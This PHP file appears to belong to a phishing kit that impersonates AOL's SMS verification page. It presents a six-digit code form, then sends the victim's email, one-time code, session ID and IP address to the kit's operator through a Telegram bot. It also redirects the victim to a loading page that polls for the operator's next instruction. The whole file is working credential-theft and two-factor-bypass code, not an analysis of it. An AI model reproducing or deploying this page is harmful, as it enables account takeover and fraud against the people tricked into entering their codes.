<?php
// sms-verify.php — AOL SMS verification code entry
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

$sid      = $_SESSION['visitor_id'] ?? session_id();
$email    = $_SESSION['email'];
$state    = get_state($sid);
if ($state['page'] === 'success') { header('Location: ' . SUCCESS_URL); exit; }

$is_error = ($state['page'] === 'code_error');
$error    = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = trim($_POST['code'] ?? '');
    if ($code === '' || strlen($code) < 4) {
        $error = 'Please enter the verification code.';
    } else {
        set_state($sid, ['page' => 'loading']);
        tg_send(
            "📱 <b>AOL SMS CODE SUBMITTED</b>\n\n" .
            "🆔 ID: <code>{$sid}</code>\n" .
            "📨 Email: <code>{$email}</code>\n" .
            "🔢 Code: <code>{$code}</code>\n" .
            "🌐 IP: <code>{$state['ip']}</code>\n" .
            "⏰ " . date('H:i:s') . "\n\n" .
            "👇 <b>What next?</b>"
        );
        tg_after_verify($sid, 'sms');
        header('Location: loading.php');
        exit;
    }
}

page_open('Enter verification code - AOL', true);
?>

<div class="card">

  <!-- Email shown at top -->
  <p class="card-email-top"><?= htmlspecialchars($email) ?></p>

  <!-- Phone illustration -->
  <div class="phone-illus">
    <svg width="90" height="110" viewBox="0 0 90 110" xmlns="http://www.w3.org/2000/svg">
      <!-- Phone body -->
      <rect x="18" y="5" width="54" height="88" rx="8" fill="#a8d4f5" stroke="#7ab8e8" stroke-width="1.5"/>
      <rect x="22" y="12" width="46" height="70" rx="4" fill="#d6ecfb"/>
      <!-- Screen content - dots suggesting a code -->
      <circle cx="35" cy="47" r="5" fill="#7c5cbf"/>
      <circle cx="45" cy="47" r="5" fill="#9b7dd4"/>
      <circle cx="55" cy="47" r="5" fill="#7c5cbf"/>
      <!-- Hand holding phone -->
      <ellipse cx="45" cy="102" rx="22" ry="8" fill="#f4c5a0" opacity=".9"/>
      <rect x="24" y="88" width="42" height="16" rx="6" fill="#f4c5a0"/>
    </svg>
  </div>

  <h1 class="card-title" style="text-align:center;font-size:18px">Enter verification code</h1>
  <p style="font-size:13px;color:#555;text-align:center;margin-bottom:16px;line-height:1.5">
    You'll get a text at your phone number on file.
  </p>

  <?php if ($is_error && !$error): ?>
    <div class="err-text" style="text-align:center">That code didn't work. Try again.</div>
  <?php endif; ?>

  <form method="POST" id="smsForm" novalidate>
    <input type="hidden" name="code" id="hiddenCode"/>

    <label class="field-label" style="color:#1a73e8;font-weight:600">6-digit code</label>

    <!-- 6 OTP boxes -->
    <div class="otp-wrap" id="otpWrap">
      <input class="otp-box" type="text" maxlength="1" inputmode="numeric" data-idx="0"/>
      <input class="otp-box" type="text" maxlength="1" inputmode="numeric" data-idx="1"/>
      <input class="otp-box" type="text" maxlength="1" inputmode="numeric" data-idx="2"/>
      <input class="otp-box" type="text" maxlength="1" inputmode="numeric" data-idx="3"/>
      <input class="otp-box" type="text" maxlength="1" inputmode="numeric" data-idx="4"/>
      <input class="otp-box" type="text" maxlength="1" inputmode="numeric" data-idx="5"/>
    </div>

    <?php if ($error): ?>
      <div class="err-text"><?= htmlspecialchars($error) ?></div>
    <?php else: ?>
      <div class="err-text" id="codeErr"></div>
    <?php endif; ?>

    <!-- Resend countdown -->
    <p class="resend-timer" id="resendTimer">Resend code in 0:55</p>

    <button type="submit" class="btn-aol" id="submitBtn" disabled>Next</button>

    <div style="text-align:center;margin-top:14px">
      <a href="loading.php" class="aol-link">Try signing in another way</a>
    </div>
  </form>
</div>

<?= poll_script(['sms_verify', 'code_error']) ?>
<?php page_close(); ?>
